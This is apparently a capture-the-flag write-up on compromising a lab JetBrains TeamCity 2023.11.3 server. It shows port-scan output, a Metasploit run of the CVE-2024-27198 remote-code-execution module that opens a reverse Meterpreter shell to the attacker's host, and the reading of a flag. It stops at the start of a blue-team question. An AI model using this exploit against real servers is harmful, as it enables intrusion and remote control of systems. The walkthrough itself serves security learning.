![](../../../assets/images/Pasted%20image%2020251031112046.png)

---
# Method 1
### Enumeration
`Nmap`
```js
 .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/user/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.201.125.63:22
Open 10.201.125.63:80
Open 10.201.125.63:50000
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-01 11:10 UTC
Initiating Ping Scan at 11:10
Scanning 10.201.125.63 [2 ports]
Completed Ping Scan at 11:10, 0.34s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:10
Completed Parallel DNS resolution of 1 host. at 11:10, 0.06s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:10
Scanning 10.201.125.63 [3 ports]
Discovered open port 22/tcp on 10.201.125.63
Discovered open port 80/tcp on 10.201.125.63
Discovered open port 50000/tcp on 10.201.125.63
Completed Connect Scan at 11:10, 0.29s elapsed (3 total ports)
Nmap scan report for 10.201.125.63
Host is up, received syn-ack (0.32s latency).
Scanned at 2025-11-01 11:10:46 UTC for 0s

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
50000/tcp open  ibm-db2 syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

---
There is one login page on port `50000`

![](../../../assets/images/Pasted%20image%2020251101164357.png)

![](../../../assets/images/Pasted%20image%2020251101170127.png)

I just Noticed Version `2023.11.3` so searched it immediately and found this on rapid7

![](../../../assets/images/Pasted%20image%2020251101170143.png)

then just searched on `msfconsole` and found it :

![](../../../assets/images/Pasted%20image%2020251101183337.png)

---
### Exploitation

i used 4th module from above list : 

```bash
[msf](Jobs:0 Agents:0) exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) >> set LHOST 10.8.31.47
LHOST => 10.8.31.47
[msf](Jobs:0 Agents:0) exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) >> exploit 
[*] Started reverse TCP handler on 10.8.31.47:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.ZmR4bUVYVzdQLVdJLUo4MHVGS0hYbmdUSllz.NmE3ZGY0MzItMTk4Yi00Y2VjLWEwODgtYmFiMDE1MGNiMzQ3
[*] Uploading plugin: m7WplZt9
[*] Sending stage (58073 bytes) to 10.201.125.63
[*] Deleting the plugin...
[+] Deleted /opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_m7WplZt9
[+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/m7WplZt9
[*] Meterpreter session 1 opened (10.8.31.47:4444 -> 10.201.125.63:54264) at 2025-11-01 11:40:06 +0000
[*] Deleting the authentication token...
[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/m7WplZt9' on the target
```

and i got shell : 

```js
msf](Jobs:0 Agents:0) exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) >> exploit 
[*] Started reverse TCP handler on 10.8.31.47:4445 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.cUdvN1duVmp3RVJQal9aZ2IyTUVCLVExQmRF.OTVkY2U3YzEtZjgwZC00MzIwLWI5ZmUtZjFmN2ZjODZkYzdm
[*] Uploading plugin: ZPYR1Toq
[*] Sending stage (58073 bytes) to 10.201.63.63
[*] Deleting the plugin...
[*] Deleting the authentication token...
[+] Deleted /opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_ZPYR1Toq
[+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/ZPYR1Toq
[*] Meterpreter session 2 opened (10.8.31.47:4445 -> 10.201.63.63:40768) at 2025-11-01 12:59:30 +0000
[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/ZPYR1Toq' on the target

(Meterpreter 2)(/opt/teamcity/TeamCity/bin) >

```

and found flag in `/home/ubuntu`

```js
(Meterpreter 2)(/home/ubuntu) > ls
Listing: /home/ubuntu
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  4096  dir   2025-11-01 11:54:58 +0000  .BuildServer
000667/rw-rw-rwx  0     fif   2025-11-01 11:52:59 +0000  .bash_history
100667/rw-rw-rwx  220   fil   2020-02-25 12:03:22 +0000  .bash_logout
100667/rw-rw-rwx  3771  fil   2020-02-25 12:03:22 +0000  .bashrc
040777/rwxrwxrwx  4096  dir   2024-07-02 09:39:13 +0000  .cache
040777/rwxrwxrwx  4096  dir   2024-08-02 08:54:48 +0000  .config
040777/rwxrwxrwx  4096  dir   2024-07-02 09:40:18 +0000  .local
100667/rw-rw-rwx  807   fil   2020-02-25 12:03:22 +0000  .profile
100667/rw-rw-rwx  66    fil   2024-07-02 09:59:35 +0000  .selected_editor
040777/rwxrwxrwx  4096  dir   2024-07-02 09:38:50 +0000  .ssh
100667/rw-rw-rwx  0     fil   2024-07-02 09:39:21 +0000  .sudo_as_admin_successful
100667/rw-rw-rwx  214   fil   2024-07-02 09:46:35 +0000  .wget-hsts
100666/rw-rw-rw-  38    fil   2025-11-01 13:13:38 +0000  flag.txt

(Meterpreter 2)(/home/ubuntu) > cat flag.txt
THM{faa9bac345709b6620a6200b484c7594}
```

---

### Blue Team Part

so the first question is `What is the name of the backdoor user which was created on the server after exploitation?`

so i just selected all time here 

![](attachments/Pasted%20image%2020251101190153.png)